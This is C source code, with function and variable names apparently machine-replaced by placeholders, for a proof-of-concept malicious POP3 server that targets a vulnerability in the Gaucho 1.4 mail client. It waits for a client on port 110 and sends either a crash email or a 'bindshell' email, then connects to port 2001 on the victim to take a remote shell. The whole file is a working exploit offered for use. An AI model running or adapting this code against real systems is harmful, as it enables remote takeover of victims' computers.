
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_port; int sin_family; } ;
typedef int sockaddr ;
typedef int sin ;
typedef int buffer ;
typedef scalar_t__ SOCKET ;
typedef int SOCKADDR ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 char* VAR_2 ;
 scalar_t__ VAR_3 ;
 int VAR_4 ;
 char* VAR_5 ;
 int FUNC_0 (int) ;
 char* VAR_6 ;
 scalar_t__ FUNC_1 (scalar_t__,int *,int*,int *,int ) ;
 int FUNC_2 () ;
 int FUNC_3 (char*) ;
 scalar_t__ VAR_7 ;
 int FUNC_4 (scalar_t__) ;
 scalar_t__ FUNC_5 (scalar_t__,int *,int) ;
 int FUNC_6 (char*,int,int,int ) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (int) ;
 scalar_t__ VAR_8 ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (scalar_t__,char*,int,int ) ;
 int FUNC_12 (scalar_t__,char*,int ,int ) ;
 int FUNC_13 (scalar_t__) ;
 scalar_t__ FUNC_14 (int ,int ,int ) ;
 int VAR_9 ;
 int FUNC_15 (char*) ;
 int FUNC_16 () ;
 scalar_t__ FUNC_17 (int) ;

int FUNC_18(int VAR_10, char* VAR_11[])
{
FUNC_10("Proof-of-Concept POP3 server for Gaucho Ver 1.4 Vulnerabilityn");
if(VAR_10 != 2)
{
FUNC_9(VAR_11[0]);
return 1;
}

int VAR_12 = FUNC_3(VAR_11[1]);
if(VAR_12 != 1 && VAR_12 != 2)
{
FUNC_10("nINVALID MODE!n");
FUNC_9(VAR_11[0]);
return 1;
}

if(!FUNC_16())
{
FUNC_10("Cannot start Winsock!n");
return 1;
}
SOCKET VAR_13 = FUNC_17(110);
if(VAR_13 == VAR_1)
{
FUNC_10("Cannot create listening socket!n");
return 1;
}
FUNC_10("Listening on POP3 port 110...n");

struct sockaddr_in VAR_14;
int VAR_15 = sizeof(VAR_14);
SOCKET VAR_16 = FUNC_1(VAR_13, (SOCKADDR *)&VAR_14, &VAR_15, ((void*)0), 0);
char VAR_17[1024];
int VAR_18;

if(VAR_16 != VAR_1)
{

FUNC_12(VAR_16, VAR_2, FUNC_15(VAR_2), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);


FUNC_12(VAR_16, VAR_2, FUNC_15(VAR_2), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);


FUNC_12(VAR_16, VAR_2, FUNC_15(VAR_2), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);


FUNC_12(VAR_16, VAR_5, FUNC_15(VAR_5), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);


FUNC_7(VAR_6);
FUNC_12(VAR_16, VAR_5, FUNC_15(VAR_5), 0);
FUNC_12(VAR_16, VAR_6, FUNC_15(VAR_6), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);


FUNC_12(VAR_16, VAR_5, FUNC_15(VAR_5), 0);
VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);

if(VAR_12 == 1)
{

FUNC_12(VAR_16, (char *)VAR_8, FUNC_15((char *)VAR_8), 0);
FUNC_10("POC crash email sent...n");

VAR_18 = FUNC_11(VAR_16, VAR_17, sizeof(VAR_17), 0);
if(VAR_18 <= 0)
return 1;

FUNC_6(VAR_17, VAR_18, 1, VAR_9);
}
else
{

FUNC_12(VAR_16, (char *)VAR_7, FUNC_15((char *)VAR_7), 0);
FUNC_10("Bindshell email sent.   Sleeping for 2 seconds...n");
FUNC_0(2000);


SOCKET VAR_19 = FUNC_14(VAR_0, VAR_4, 0);
if(VAR_19 == VAR_1)
{
FUNC_10("Invalid socket return in socket() call.n");
FUNC_2();
return -1;
}

VAR_14.sin_family = VAR_0;
VAR_14.sin_port = FUNC_8(2001);

if(FUNC_5(VAR_19, (sockaddr *)&VAR_14, sizeof(VAR_14)) == VAR_3)
{
FUNC_10("Exploit Failed. SOCKET_ERROR return in connect call.n");
FUNC_4(VAR_19);
FUNC_2();
return -1;
}

FUNC_10("n");
FUNC_13(VAR_19);
}
}

return 0;
}
